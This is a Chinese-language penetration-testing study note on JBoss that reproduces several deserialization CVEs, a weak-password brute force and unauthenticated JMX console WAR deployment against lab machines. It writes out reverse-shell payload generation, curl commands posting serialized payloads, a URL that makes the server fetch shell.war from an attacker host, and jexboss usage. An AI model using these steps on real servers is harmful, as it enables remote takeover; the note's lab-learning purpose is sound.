# JBOSS渗透学习

## 一、JBoss介绍

JBoss是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。

> EJB 是运行在独立服务器上的组件，客户端是通过网络对EJB 对象进行调用。变成大白话就是，"把你编写的软件中那些需要执行制定的任务的类，不放到客户端软件上了，而是给他打成包放到一个服务器上了"。
> 
> 中间件是一个独立的系统软件或服务程序，为应用程序提供合作互通、资源共享等服务。
> 
> Servlet 是运行在 Web 服务器上的程序，是客户端和服务器之间的中间层，用于处理请求的逻辑（类似CGI）  
> [Tomcat下Servlet与CGI区别和内容](https://blog.csdn.net/lixisd/article/details/81604024)  
> [servlet的本质是什么，它是如何工作的？](https://www.zhihu.com/question/21416727)

### 1、下载安装启动配置

#### 0x01 JDK安装

JDK版本:1.6 ~ 1.7

默认下一步即可

#### 0x02 JBoss安装

配置两台虚拟机，一台安装6.0，一台安装4.0

下载地址：[JBoss Application Server Downloads - JBoss Community](https://jbossas.jboss.org/downloads)

> JBoss4以下用JDK6 JBoss5~7用JDK7

#### 0x03 JBoss环境变量  
  

1）新建系统变量`JBOSS_HOME`

![g9E1r4.png](_v_images/20210527142250667_7885.png)

2）在`path`最后中加入

```
;%JBOSS_HOME%\bin;

```

![g9EnP0.png](_v_images/20210527142250530_4848.png)

#### 0x04 启动JBoss

双击`run.bat`即可

#### 0x05 配置JBoss

设置外网可以访问，路径`C:\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml`

![g9EMxU.png](_v_images/20210527142250398_12996.png)

重启即可

对于`JBoss4`版本，`C:\jboss-4.2.3.GA\server\default\deploy\jboss-web.deployer\server.xml`

![g9ElMF.png](_v_images/20210527142250241_4057.png)

### 2、目录介绍

`JBoss`默认部署路径：`C:\jboss-6.1.0.Final\server\default\deploy\ROOT.war`

网站位置：`C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost`

## 二、JBoss漏洞分析及复现

> 目前而言，以下漏洞都是复现操作为主，原理由于本人还太菜，未来再回来补充【4.26】

### 1、JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）

> 命令执行、getshell

#### 0x01 漏洞概述

该漏洞位于`JBoss`的`HttpInvoker`组件中的`ReadOnlyAccessFilter`过滤器中，其`doFilter`方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。攻击者利用该漏洞无需用户验证在系统上执行任意命令，获得服务器的控制权。

影响版本：

- JbossAS 5.x
    
- JbossAS 6.x
    

#### 0x02 复现操作

实验靶机`IP`为`192.168.112.148`

1）验证漏洞存在|漏洞指纹

访问`http://192.168.112.148:8080/invoker/readonly`页面，回显500表示存在

![g9EK2T.png](_v_images/20210527142250099_14001.png)

2）安装`javac`

用于`java`编译这块

`java javac`等混淆概念：[(8条消息) 一文搞懂JDK8与Java1.8的区别_非著名运维的博客-CSDN博客](https://blog.csdn.net/qq_44895681/article/details/105365655)

```
cd /opt
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version

```

3）工具下载

下载地址：[joaomatosf/JavaDeserH2HC: Sample codes written for the Hackers to Hackers Conference magazine 2017 (H2HC). (github.com)](https://github.com/joaomatosf/JavaDeserH2HC)

4）开启监听

```
nc -vlp 8888

```

![g9EuGV.png](_v_images/20210527142249965_24813.png)

5）一系列操作

> 这部分底层原理留给日后回来研究【4.26】，现在只能依葫芦画瓢

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.112.132:8888

# 以二进制格式发送.ser包
curl http://192.168.112.148:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser

```

![g9E6II.png](_v_images/20210527142249833_8862.png)

![g9EsZd.png](_v_images/20210527142249694_13487.png)

#### 0x03 漏洞原理分析

[JBoss反序列化漏洞分析](https://zhuanlan.zhihu.com/p/33532884)

漏洞出现在 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中，源码在jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet目录下的ReadOnlyAccessFilter.class文件中,其中doFilter函数代码如下:

```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
  throws IOException, ServletException
{
  HttpServletRequest httpRequest = (HttpServletRequest)request;
  Principal user = httpRequest.getUserPrincipal();
  if ((user == null) && (this.readOnlyContext != null))
  {
    ServletInputStream sis = request.getInputStream();
    ObjectInputStream ois = new ObjectInputStream(sis);
    MarshalledInvocation mi = null;
    try
    {
      mi = (MarshalledInvocation)ois.readObject();
    }
    catch (ClassNotFoundException e)
    {
      throw new ServletException("Failed to read MarshalledInvocation", e);
    }
    request.setAttribute("MarshalledInvocation", mi);

    mi.setMethodMap(this.namingMethodMap);
    Method m = mi.getMethod();
    if (m != null) {
      validateAccess(m, mi);
    }
  }
  chain.doFilter(request, response);
}

```

可以看到其直接从http中获取数据，在没有进行检查或者过滤的情况下，尝试调用`readobject()`方法对数据流进行反序列操作，因此产生了Java反序列化漏洞。

### 2、JBoss JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）

> getshell

#### 0x01 漏洞概述

该漏洞的产生是由于`JBoss`在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，利用`Apache Commons Collections`中的`Gadget`执行任意代码

#### 0x02 复现操作

实验靶机`IP`为`192.168.112.148`

1）验证漏洞存在|漏洞指纹

访问页面`http://192.168.112.148:8080/invoker/JMXInvokerServlet`，回显如下的消息则含有该漏洞

![g9EDqH.png](_v_images/20210527142249557_25347.png)

2）开启监听

```
nc -lvp 8888

```

3）使用工具直接攻击

> 这部分底层原理留给日后回来研究【4.26】，现在只能依葫芦画瓢

工具和上面漏洞1的一样

```
curl http://192.168.112.148:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser

```

![g9EydA.png](_v_images/20210527142249422_27881.png)

#### 0x03 漏洞分析

[JBoss JMXInvokerServlet 反序列化漏洞分析 - 从0开始学习Java反序列化 (4) | whip1ash](http://whip1ash.cn/2018/11/19/java-deserialization-3/)

#### 0x04 修复建议

删除`http-invoker.sar`组件，路径在：`C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar`，删除后再访问`http://192.168.112.148:8080/invoker/JMXInvokerServlet`，返回`404`

### 3、JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

> getshell

#### 0x01 漏洞概述

JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。

影响版本：

JBoss AS 4.0及之前

#### 0x02 复现操作

1）验证漏洞存在|漏洞指纹

访问`http://192.168.112.147:8080/jbossmq-httpil/HTTPServerILServlet`，回显如下页面则有漏洞

![g9ViJx.png](_v_images/20210527142249287_10582.png)

2）执行攻击

使用之前生成的`.ser`文件，通过POST 二进制数据上去，反向连接shell，需要先开监听

```
curl http://192.168.112.148:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser

```

![g9VrlT.png](_v_images/20210527142249155_11804.png)

### 4、JBoss EJBInvokerServlet 反序列化漏洞（CVE-2013-4810）

> getshell

#### 0x01 影响版本

`JBoss6.x`以上

#### 0x02 复现操作

1）漏洞指纹

访问`http://192.168.112.148:8080/invoker/EJBInvokerServlet`，如下图则存在该漏洞

![g9VPF1.png](_v_images/20210527142249016_999.png)

2）执行攻击

使用之前生成的`.ser`文件，通过POST 二进制数据上去，反向连接shell，需要先开监听

```
curl http://192.168.112.148:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser

```

![g9VFW6.png](_v_images/20210527142248881_3723.png)

> 反序列化文章：
> 
> [浅析反序列化POC - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/250271.html)

### 5、Administration Console 弱口令

> 后台getshell

#### 0x01 环境配置

环境为`JBoss6`

#### 0x02 密码信息

密码信息保存在`\server\default\conf`

#### 0x03 复现操作

1）登陆进后台

![g9ExL4.png](_v_images/20210527142248748_16301.png)

2）上传war文件

![g9VSeJ.png](_v_images/20210527142248615_16983.png)

![g9EvyF.png](_v_images/20210527142248481_29416.png)

![g9Vpw9.png](_v_images/20210527142248344_18829.png)

3）冰蝎连接

![g9VyXF.png](_v_images/20210527142248209_9669.png)

#### 0x04 Burp Suite爆破

1）查看数据传输格式

![g9Vcm4.png](_v_images/20210527142248076_32278.png)

2）选择爆破模式和爆破的位置

![g9VwYq.png](_v_images/20210527142247739_28277.png)

3）载入payload

> 这里测试，随便写了密码账号文件

![g9VDpV.png](_v_images/20210527142247597_15080.png)

![g9V0f0.png](_v_images/20210527142247459_4162.png)

4）执行攻击，找到不同的包

![g9Vs6U.png](_v_images/20210527142247322_742.png)

### 6、JMX Console未授权访问漏洞

> 后台部署文件、getshell

#### 0x01 漏洞概述

在默认未配置的情况下，可以访问`/jmx-console`目录，并部署相关`war`包，部署的war包在本地的路径为： JBoss AS 6.x：`C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost`JBoss AS 4.x：`C:\jboss-4.2.3.GA\server\default\work\jboss.web\localhost`

#### 0x02 复现操作

##### Ⅰ. 4.x版本漏洞复现

1）前往部署页面

```
http://192.168.112.147:8080/jmx-console/

```

打开`jmx-console`界面，找到`jboss.deployment`，点击下面的`URL`

![gCbqx0.png](_v_images/20210527142247182_20909.png)

2）上传、部署war包

在`kali`上开启小型服务器，通过`kali`上传`shell.war`包（实际情况是在vps上开启此功能）

![gCb7Ps.png](_v_images/20210527142247050_23888.png)

找到`void addURL()`一栏，填入`http://192.168.112.132/shell.war`

![gCbOMV.png](_v_images/20210527142246917_23467.png)

还是在刚刚那界面，最上面点击`Apply Changes`

![gCbXrT.png](_v_images/20210527142246779_24252.png)

3）war包部署成功

![gCbjqU.png](_v_images/20210527142246638_7263.png)

4）上线冰蝎

![gCbHGn.png](_v_images/20210527142246495_22755.png)

##### Ⅱ. 6.x版本漏洞复现

> 操作类似

上传、部署

```
http://192.168.112.148:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://192.168.112.132/shell2.war

```

![gCbo5j.png](_v_images/20210527142246363_27157.png)

上线冰蝎

![gCbb2q.png](_v_images/20210527142246227_16587.png)

## 三、jexboss自动化JBoss渗透

JexBoss是一个用于测试和利用JBoss应用服务器和其他Java平台、框架、应用程序等漏洞的工具。

下载地址： [joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)](https://github.com/joaomatosf/jexboss)

JexBoss工具报告：[JexBoss – JBoss Verify and EXploitation Tool | CISA](https://us-cert.cisa.gov/ncas/analysis-reports/AR18-312A)

1）环境配置

```
# python > 2.7.x
python2 --version

# 安装 pip2
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
python2 get-pip.py

```

2）执行脚本

```
python jexboss.py -host http://192.168.112.147:8080

```

![g9ZSc8.png](_v_images/20210527142246088_3916.png)

3）输入自动化渗透目标

这里JBoss为本地搭建的4.0版本

![g9ZpjS.png](_v_images/20210527142245942_21020.png)

4）得到shell

![g9ZCng.png](_v_images/20210527142245773_3842.png)

> 本篇文章中的技术仅用于学习，文中提及的技术若用于攻击方面，作者概不负责！
> 
> 本篇文章是作者我阅览了大量文章及复现操作后的一篇JBoss渗透总结，若是大家觉得写不错、有帮助的话，可以分享共同进步，谢谢！